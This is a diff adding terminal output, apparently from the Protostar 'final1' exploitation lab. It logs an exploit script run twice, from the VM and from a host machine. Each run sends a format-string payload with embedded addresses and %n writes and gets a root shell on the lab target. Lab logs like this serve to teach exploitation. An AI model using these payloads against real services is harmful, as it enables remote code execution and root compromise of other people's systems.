@@ -1,0 +1,54 @@
+# Execute in the virtual machine:
+
+user@protostar:/tmp$ ./final1.rb 
+> Enter hostname:
+localhost
+> 127.0.0.1:47560
+> send: "username wwwwwwwww\250\241\004\b\251\241\004\b\252\241\004\b%124x%17$n%79x%18$n%46829x%19$n\n"
+[final1] $ 
+[final1] $ 
+login failed
+[final1] $ 
+> #
+uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+[final1] $ 
+whoami
+root
+[final1] $ 
+id
+uid=0(root) gid=0(root) groups=0(root)
+[final1] $ 
+^C./final1.rb:117:in `gets': Interrupt
+	from ./final1.rb:117
+
+user@protostar:/tmp$ 
+
+
+
+# Execute in the host:
+
+> uname -a
+Darwin Senris-MacBook-Pro.local 21.4.0 Darwin Kernel Version 21.4.0: Mon Feb 21 20:34:37 PST 2022; root:xnu-8020.101.4~2/RELEASE_X86_64 x86_64
+> ./final1.rb
+> Enter hostname:
+192.168.215.129
+> 192.168.215.1:60070
+> send: "username wwwww\xA8\xA1\x04\b\xA9\xA1\x04\b\xAA\xA1\x04\b%124x%17$n%79x%18$n%46829x%19$n\n"
+[final1] $ 
+[final1] $ 
+login failed
+[final1] $ 
+> #
+uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+[final1] $ 
+whoami
+root
+[final1] $ 
+id
+uid=0(root) gid=0(root) groups=0(root)
+[final1] $ 
+^C./final1.rb:117:in `gets': Interrupt
+	from ./final1.rb:117:in `gets'
+	from ./final1.rb:117:in `<main>'
